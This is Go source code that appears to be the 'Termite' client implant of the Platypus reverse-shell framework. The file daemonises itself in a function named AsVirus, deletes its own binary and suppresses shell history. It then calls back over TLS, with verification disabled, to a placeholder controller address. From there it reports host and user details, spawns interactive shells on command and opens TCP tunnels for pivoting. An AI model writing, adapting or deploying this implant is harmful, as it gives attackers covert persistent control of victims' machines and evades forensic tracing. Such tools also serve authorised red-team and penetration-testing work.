package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/WangYihang/Platypus/lib/util/crypto"
	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/message"
	"github.com/creack/pty"
	"github.com/sevlyar/go-daemon"
)

type Backoff struct {
	Current int64
	Unit    time.Duration
	Max     int64
}

func (b *Backoff) Reset() {
	b.Current = 1
}

func (b *Backoff) increase() {
	b.Current <<= 1
	if b.Current > b.Max {
		b.Reset()
	}
}

func (b *Backoff) Sleep(add int64) {
	var i int64 = 0
	for i < b.Current+add {
		time.Sleep(b.Unit)
		i++
	}
	b.increase()
}

func CreateBackOff() *Backoff {
	backoff := &Backoff{
		Unit: time.Second,
		Max:  0x100,
	}
	backoff.Reset()
	return backoff
}

var backoff *Backoff

type TermiteProcess struct {
	ptmx       *os.File
	windowSize *pty.Winsize
	process    *exec.Cmd
}

var processes map[string]*TermiteProcess
var tunnels map[string]*net.Conn

type Client struct {
	Conn    *tls.Conn
	Encoder *gob.Encoder
	Decoder *gob.Decoder
}

func handleConnection(c *Client) {
	oldBackoffCurrent := backoff.Current

	for {
		msg := &message.Message{}
		err := c.Decoder.Decode(msg)
		if err != nil {
			// Network
			log.Error("Network error: %s", err)
			break
		}
		backoff.Reset()
		switch msg.Type {
		case message.STDIO:
			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
				termiteProcess.ptmx.Write(msg.Body.(*message.BodyStdio).Data)
			}
		case message.WINDOW_SIZE:
			serverWindowSize := &pty.Winsize{
				Cols: uint16(msg.Body.(*message.BodyWindowSize).Columns),
				Rows: uint16(msg.Body.(*message.BodyWindowSize).Rows),
				X:    0,
				Y:    0,
			}
			// Change pty window size
			if termiteProcess, exists := processes[msg.Body.(*message.BodyWindowSize).Key]; exists {
				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
			}
		case message.PROCESS_START:
			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
			if bodyStartProcess.Path == "" {
				continue
			}
			log.Success("Starting process: %s", bodyStartProcess.Path)
			process := exec.Command(bodyStartProcess.Path)

			// Disable command history
			process.Env = os.Environ()
			process.Env = append(process.Env, "HISTORY=")
			process.Env = append(process.Env, "HISTSIZE=0")
			process.Env = append(process.Env, "HISTSAVE=")
			process.Env = append(process.Env, "HISTZONE=")
			process.Env = append(process.Env, "HISTLOG=")
			process.Env = append(process.Env, "HISTFILE=")
			process.Env = append(process.Env, "HISTFILE=/dev/null")
			process.Env = append(process.Env, "HISTFILESIZE=0")

			windowSize := pty.Winsize{
				uint16(bodyStartProcess.WindowRows),
				uint16(bodyStartProcess.WindowColumns),
				0,
				0,
			}
			ptmx, _ := pty.StartWithSize(process, &windowSize)
			processes[bodyStartProcess.Key] = &TermiteProcess{
				windowSize: &windowSize,
				ptmx:       ptmx,
				process:    process,
			}
			log.Success("Process started: %d", process.Process.Pid)
			log.Success("Process added: %v", processes)
			defer func() { _ = ptmx.Close() }()

			err = c.Encoder.Encode(message.Message{
				Type: message.PROCESS_STARTED,
				Body: message.BodyProcessStarted{
					Key: bodyStartProcess.Key,
					Pid: process.Process.Pid,
				},
			})
			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				break
			}

			go func() {
				for {
					buffer := make([]byte, 0x10)
					n, err := ptmx.Read(buffer)
					if err != nil {
						if err == io.EOF {
							err = c.Encoder.Encode(message.Message{
								Type: message.PROCESS_STOPED,
								Body: message.BodyProcessStoped{
									Key:  bodyStartProcess.Key,
									Code: 0,
								},
							})
							if err != nil {
								// Network
								fmt.Println("Process stoped: %v", err)
								break
							}
							break
						}
						break
					}
					if n > 0 {
						err = c.Encoder.Encode(message.Message{
							Type: message.STDIO,
							Body: message.BodyStdio{
								Key:  bodyStartProcess.Key,
								Data: buffer[0:n],
							},
						})
						if err != nil {
							// Network
							log.Error("Network error: %s", err)
							break
						}
					}
				}
			}()

			// Wait process exit
			go func() {
				err := process.Wait()

				exitCode := 0
				if err != nil {
					exitCode = err.(*exec.ExitError).ExitCode()
				}
				fmt.Println("Exit code: ", exitCode)

				err = c.Encoder.Encode(message.Message{
					Type: message.PROCESS_STOPED,
					Body: message.BodyProcessStoped{
						Key:  bodyStartProcess.Key,
						Code: exitCode,
					},
				})

				if err != nil {
					// Network
					log.Error("Network error: %s", err)
				}

				delete(processes, bodyStartProcess.Key)
			}()
		case message.PROCESS_STARTED:
		case message.PROCESS_STOPED:
		case message.GET_CLIENT_INFO:
			// User Information
			userInfo, err := user.Current()
			var username string
			if err != nil {
				username = "Unknown"
			} else {
				username = userInfo.Username
			}
			// Python
			python2, err := exec.LookPath("python2")
			if err != nil {
				python2 = ""
			}

			python3, err := exec.LookPath("python3")
			if err != nil {
				python3 = ""
			}

			// Network interfaces
			interfaces := map[string]string{}
			ifaces, _ := net.Interfaces()
			for _, i := range ifaces {
				interfaces[i.Name] = i.HardwareAddr.String()
			}

			err = c.Encoder.Encode(message.Message{
				Type: message.CLIENT_INFO,
				Body: message.BodyClientInfo{
					User:              username,
					OS:                runtime.GOOS,
					Python2:           python2,
					Python3:           python3,
					NetworkInterfaces: interfaces,
				},
			})

			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				return
			}
		case message.DUPLICATED_CLIENT:
			backoff.Current = oldBackoffCurrent
			log.Error("Duplicated connection")
			os.Exit(0)
		case message.PROCESS_TERMINATE:
			key := msg.Body.(*message.BodyTerminateProcess).Key
			log.Success("Request terminate %s", key)
			if termiteProcess, exists := processes[key]; exists {
				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
				termiteProcess.ptmx.Close()
			}
		case message.TUNNEL_CONNECT:
			address := msg.Body.(*message.BodyTunnelConnect).Address
			token := msg.Body.(*message.BodyTunnelConnect).Token

			conn, err := net.Dial("tcp", address)
			if err != nil {
				log.Error(err.Error())
				c.Encoder.Encode(message.Message{
					Type: message.TUNNEL_CONNECT_FAILED,
					Body: message.BodyTunnelConnectFailed{
						Token:  token,
						Reason: err.Error(),
					},
				})
			} else {
				err := c.Encoder.Encode(message.Message{
					Type: message.TUNNEL_CONNECTED,
					Body: message.BodyTunnelConnected{
						Token: token,
					},
				})

				if err != nil {
					log.Error(err.Error())
				} else {
					tunnels[token] = &conn
					go func() {
						for {
							data := make([]byte, 0x100)
							n, err := conn.Read(data)
							if err != nil {
								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
								c.Encoder.Encode(message.Message{
									Type: message.TUNNEL_DISCONNECTED,
									Body: message.BodyTunnelDisconnected{
										Token: token,
									},
								})
								conn.Close()
								break
							} else {
								if n > 0 {
									c.Encoder.Encode(message.Message{
										Type: message.TUNNEL_DATA,
										Body: message.BodyTunnelData{
											Token: token,
											Data:  data[0:n],
										},
									})
								}
							}
						}
					}()
				}
			}
		case message.TUNNEL_DATA:
			token := msg.Body.(*message.BodyTunnelData).Token
			data := msg.Body.(*message.BodyTunnelData).Data
			if conn, exists := tunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
				}
			} else {
				log.Error("No such tunnel")
			}
		case message.TUNNEL_DISCONNECT:
			token := msg.Body.(*message.BodyTunnelDisconnect).Token
			if conn, exists := tunnels[token]; exists {
				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
				(*conn).Close()
				delete(tunnels, token)
				c.Encoder.Encode(message.Message{
					Type: message.TUNNEL_DISCONNECTED,
					Body: message.BodyTunnelDisconnected{
						Token: token,
					},
				})
			} else {
				log.Error("No such tunnel")
			}
		}
	}
}

func StartClient() bool {
	needRetry := true
	certBuilder := new(strings.Builder)
	keyBuilder := new(strings.Builder)
	crypto.Generate(certBuilder, keyBuilder)

	pemContent := []byte(fmt.Sprint(certBuilder))
	keyContent := []byte(fmt.Sprint(keyBuilder))

	cert, err := tls.X509KeyPair(pemContent, keyContent)
	if err != nil {
		log.Error("server: loadkeys: %s", err)
		return needRetry
	}

	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
		log.Debug("Connecting to: %s", service)
		conn, err := tls.Dial("tcp", service, &config)
		if err != nil {
			log.Error("client: dial: %s", err)
			return needRetry
		}
		defer conn.Close()

		state := conn.ConnectionState()
		for _, v := range state.PeerCertificates {
			x509.MarshalPKIXPublicKey(v.PublicKey)
		}

		log.Debug("client: handshake: %s", state.HandshakeComplete)
		log.Debug("client: mutual: %s", state.NegotiatedProtocolIsMutual)
		log.Success("Secure connection established on %s", conn.RemoteAddr())

		c := &Client{
			Conn:    conn,
			Encoder: gob.NewEncoder(conn),
			Decoder: gob.NewDecoder(conn),
		}
		handleConnection(c)
		return needRetry
	} else {
		return !needRetry
	}
}

func RemoveSelfExecutable() {
	filename, _ := filepath.Abs(os.Args[0])
	os.Remove(filename)
}

func AsVirus() {
	cntxt := &daemon.Context{
		WorkDir: "/",
		Umask:   027,
		Args:    []string{},
	}

	d, err := cntxt.Reborn()
	if err != nil {
		log.Error("Unable to run: ", err)
	}
	if d != nil {
		return
	}
	defer cntxt.Release()
	log.Success("daemon started")

	RemoveSelfExecutable()
}

func main() {
	AsVirus()
	message.RegisterGob()
	backoff = CreateBackOff()
	processes = map[string]*TermiteProcess{}
	tunnels = map[string]*net.Conn{}
	for {
		if !StartClient() {
			break
		}
		add := (int64(rand.Uint64()) % backoff.Current)
		log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
		backoff.Sleep(add)
	}
}
